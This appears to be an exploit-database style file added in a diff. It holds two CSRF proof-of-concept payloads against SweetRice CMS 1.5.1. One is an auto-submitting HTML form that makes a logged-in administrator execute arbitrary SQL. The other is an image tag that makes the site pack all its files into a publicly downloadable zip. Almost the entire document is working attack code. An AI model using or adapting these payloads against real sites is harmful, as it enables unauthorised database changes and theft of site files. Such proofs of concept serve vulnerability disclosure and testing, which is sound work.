@@ -1,0 +1,35 @@
+<!--
+# Exploit Title: SweetRice 1.5.1 - Cross-Site Request Forgery
+# Exploit Author: Ashiyane Digital Security Team
+# Date: 03-11-2016
+# Vendor: http://www.basic-cms.org/
+# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+# Version: 1.5.1
+# Platform: WebApp - PHP - Mysql
+
+# Exploit 1:
+-->
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://localhost/as/?type=data&mode=sql_execute&form_mode=yes" method="POST">
+      <input type="hidden" name='sql_content' value="CREATE DATABASE testfcb">
+      <input type="submit" value="Execute" />
+      </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+<!--
+Exploit 2:
+Next send request a file with name 'SweetRice-transfer.zip' create in main directory and you can access to all of files in this url:
+http://localhost/SweetRice-transfer.zip
+-->
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <img src='http://localhost/1/as/?type=data&mode=transfer&form_type=pack'></img>
+  </body>
+</html>
